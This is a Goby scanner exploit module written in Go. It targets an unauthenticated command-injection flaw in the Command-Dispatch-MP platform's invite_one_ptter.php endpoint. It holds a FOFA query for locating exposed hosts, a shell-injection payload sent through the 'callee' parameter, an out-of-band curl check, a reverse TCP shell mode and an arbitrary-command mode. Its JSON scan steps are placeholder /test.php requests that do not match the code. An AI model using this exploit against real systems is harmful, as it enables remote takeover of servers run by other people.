package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Command-Dispatch-MP /api/client/ptt/invite_one_ptter.php Command Execution Vulnerability",
    "Description": "<p>Command execution vulnerability exists in Command-Dispatch-MP invite_one_ptter.php.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Command-Dispatch-MP",
    "Homepage": "https://www.yulongyidong.com/",
    "DisclosureDate": "2023-04-26",
    "PostTime": "2024-04-11",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"./images/zhanghu.png\" && body=\"captcha.php\"",
    "GobyQuery": "body=\"./images/zhanghu.png\" && body=\"captcha.php\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.yulongyidong.com/\">https://www.yulongyidong.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "Reverse,Command",
            "show": ""
        },
        {
            "name": "command",
            "type": "input",
            "value": "id",
            "show": "attackType=Command"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "HW-2023"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "指挥调度管理平台 /api/client/ptt/invite_one_ptter.php 命令执行漏洞",
            "Product": "指挥调度管理平台",
            "Description": "<p>指挥调度管理平台invite_one_ptter.php存在命令执行漏洞。<br></p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yulongyidong.com/\">https://www.yulongyidong.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Command-Dispatch-MP /api/client/ptt/invite_one_ptter.php Command Execution Vulnerability",
            "Product": "Command-Dispatch-MP",
            "Description": "<p>Command execution vulnerability exists in&nbsp;Command-Dispatch-MP invite_one_ptter.php.<br></p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.yulongyidong.com/\">https://www.yulongyidong.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10966"
}`

	var runCommandAdufcnadf34123 = func(u *httpclient.FixUrl, cmd string) error {
		uri := "/api/client/ptt/invite_one_ptter.php?callee="
		payload := `1";` + cmd + `;"`
		payload = url.QueryEscape(payload)
		cfg := httpclient.NewGetRequestConfig(uri + payload)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return err
		}
		if !strings.Contains(resp.Utf8Html, `{"st":"0"}`) {
			return errors.New(`command exec failed`)
		}
		return nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := "curl " + checkUrl
			err := runCommandAdufcnadf34123(u, cmd)
			if err != nil {
				return false
			}
			if !godclient.PullExists(checkStr, time.Second*15) {
				return false
			}
			ss.VulURL = u.FixedHostInfo + "/api/client/ptt/invite_one_ptter.php"
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			if attackType == "Reverse" {
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				rp, err := godclient.WaitSession("reverse_windows", waitSessionCh)
				if err != nil || len(rp) == 0 {
					expResult.Success = false
					expResult.Output = "godclient bind failed"
					return expResult
				}

				command := godclient.ReverseTCPBySh(rp)
				go runCommandAdufcnadf34123(expResult.HostInfo, command)
				//检测为固定格式
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 15):
				}
			}

			command := ss.Params["Command"].(string)
			if attackType == "Command" {
				err := runCommandAdufcnadf34123(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "命令已成功执行，但该漏洞无法回显，请自行确认"
				return expResult
			}

			return expResult
		},
	))
}
